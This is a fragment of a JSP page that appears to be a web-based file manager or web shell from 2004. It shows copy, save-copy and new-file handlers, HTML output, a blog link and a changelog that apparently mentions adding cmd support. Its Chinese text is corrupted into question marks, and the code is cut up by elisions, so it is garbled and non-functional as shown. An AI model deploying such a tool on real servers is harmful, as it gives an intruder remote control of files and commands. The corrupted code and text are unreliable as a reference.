...
String[] authorInfo={" <font color=red> ??????????????? </font>"," <font color=red> U.S </font>"};
...
if(strAction!=null && strAction.equals("copy"))
{
	...
	sbCopy.append("???????? <input type=text name=file2 size=40 value='"+strDir+"'><p>");
...
if(strAction!=null && strAction.equals("savecopy"))
{
	...
	{
		sbSaveCopy.append("<p><font color=red>??????????</font>");
	}
	else
	{
		...
		else
		{
			...
			sbSaveCopy.append("?????? ??"+strTmpFile+"<p>");
...
if(strAction!=null && strAction.equals("newFile"))
{
	...
	{
		sbNewFile.append("<p><font color=red>???????????????</font>");
	}
}
...
<p>????????</p>
<p>&nbsp;&nbsp;&nbsp;<b>????????ù??????????????????????????????????????????????????????????<p>
?????????<a href="http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx" target="_blank">http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx</a></b>
<p>&nbsp;</p>
<p>???????</p>
<p>&nbsp;&nbsp;&nbsp; 2004.11.29&nbsp; V1.0???????????????Linux?????????????Linux???????????á?</p>
<p>&nbsp;&nbsp;&nbsp; 2004.11.15&nbsp; V0.9??????????????????????????????????????????????????????????????</p>
<p>&nbsp;&nbsp;&nbsp; 2004.10.27&nbsp; ??????0.6???? ???????????????? ?? cmd????</p>
<p>&nbsp;&nbsp;&nbsp; 2004.09.20&nbsp; ?????jsp&nbsp;????????????????????????????</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
</div>
	...
	%>
		<span id="EditBox"><table width="98%" border="1" cellspacing="1" cellpadding="4" bordercolorlight="#cccccc" bordercolordark="#FFFFFF" bgcolor="white" >
            ...
            <%=sbFile%>
             <!-- <tr align="center"> 
                <td colspan="4"><br>
                  ??????????<font color="#FF0000">30</font> ???????<font color="#FF0000">664.9</font> 
                  KB </td>
              </tr>
			 -->
            </table>
